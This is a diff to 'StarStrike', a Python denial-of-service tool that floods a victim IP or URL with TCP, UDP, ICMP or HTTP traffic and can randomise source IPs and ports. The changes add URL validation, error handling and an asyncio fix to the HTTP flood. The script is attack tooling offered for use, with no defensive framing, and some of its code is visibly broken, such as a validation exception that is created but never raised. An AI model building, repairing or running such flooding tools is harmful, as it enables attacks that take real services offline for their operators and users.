@@ -31,11 +31,12 @@ from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
 import asyncio
 from fake_useragent import UserAgent
 from secrets import randbelow
+from socket import gethostbyname
 
 def print_banner():
     print(r'''
 #          _____ __             _____ __      _              #
-#         / ___// /_____ ______/ ___// /____ (_)/____        #
+#         / ___// /_____ ______/ ___// /____ (_)/ ____       #
 #        \__ \/ __/ __ `/ ___/\__ \/ __/ __// //_/ _ \       #
 #        ___/ / /_/ /_/ / /   ___/ / /_/ / / ,< /  __/       #
 #       /____/\__/\__,_/_/   /____/\__/_/ /_/|_|\___/        #
@@ -43,9 +44,8 @@ def print_banner():
 ''')
 
 tsize = 0 #total bytes sent
-types = ["tcp", "udp", "icmp", "http"] # types of attack
+types = ["tcp", "udp", "icmp", "http"] # types of attack (not sure if http flood works)
 athreads = [] # contains all current threads
-ros = 0
 
 #-- defaults --#
 threads=10
@@ -57,12 +57,17 @@ lock_port=True
 port=3703
 dest_url = "about:blank"
 n_req = 1000
-up_ip = False
+up_ip = False #unpredictable source ip
 
 #validate ip
-def validate_ip(ip):
-    if len(ip.split('.')) == 4: return True
-    return False
+def validate_ip(ip: str):
+    if len(ip.split('.')) == 4: return
+    Exception("Invalid IP!")
+#validate url
+def validate_url(url: str):
+    e = url.removeprefix("https://") if url.startswith("https://") else url.removeprefix("http://")
+    try: gethostbyname(e)
+    except Exception as a: exit(f"Invalid URL!\n{a}")
 
 #-- arg handling --#
 if len(sys.argv) > 1:
@@ -79,14 +84,15 @@ if len(sys.argv) > 1:
         # set the type
         if arg.startswith("--type"):
             typea = arg.removeprefix("--type")
-            if not typea in types: exit(f"{type} as an attack type doesnt exist!")
+            if not typea in types: exit(f"{typea} as an attack type doesnt exist!")
         # the victims ip
         if arg.startswith("--victimip"):
             dest_ip = arg.removeprefix("--victimip")
-            if not validate_ip(dest_ip): exit("Invalid IP!")
+            validate_ip(dest_ip)
         # the victims url for http flood
         if arg.startswith("--victimurl"):
             dest_url = arg.removeprefix("--victimurl")
+            validate_url(dest_url)
         # unlock port randomization
         if arg == "--unlockport":
             lock_port = False
@@ -97,7 +103,7 @@ if len(sys.argv) > 1:
         # set number of requests for http flood
         if arg.startswith("--rqn"):
             n_req == int(arg.removeprefix("--rqn"))
-        # make ip unpredictable (use secrets.randbelow() instead of random.randint())
+        # make ip unpredictable (uses secrets.randbelow() instead of random.randint())
         if arg == "--upip":
             up_ip = True
 else: exit("Check the code to see how you configure it, or just do python starstrike.py --victimip[target ip]")
@@ -169,11 +175,12 @@ async def send_req(session, thread):
             tsize +=1
             print(f"[HTTP] GET REQUEST SENT TO {dest_url} STATUS: {response.status} THREAD {thread}")
     except TimeoutError:
-        print("[HTTP] timed out, trying again...")
+        print("[HTTP] timed out")
     except ClientError as e:
-        print(f"[HTTP] client error \n{e}")
+        print(f"[HTTP] client exception: {e}")
+    except Exception as e: print(f"[HTTP] exception: {e}")
 
-#http flood attack
+#http flood attack (very buggy)
 async def http_flood(thread):
     connection = TCPConnector()
     timeout = ClientTimeout(total=10)
@@ -197,13 +204,14 @@ def attack(thread):
         case "tcp": tcp_flood(thread)
         case "udp": udp_flood(thread)
         case "icmp": icmp_flood(thread)
-        case "http": http_flood(thread)
+        case "http": asyncio.run(http_flood(thread))
 
 #-- MAIN --#
 def main():
     print_banner()
     print("StarStrike created by solez, for NETWORK0 group\n")
     # HelloWorld("print")
+    # more threads = faster attack but slower execution speed and slower stopping
     tcount = threads
     while not len(athreads) == threads:
         t = threading.Thread(target=attack, args=(tcount,))
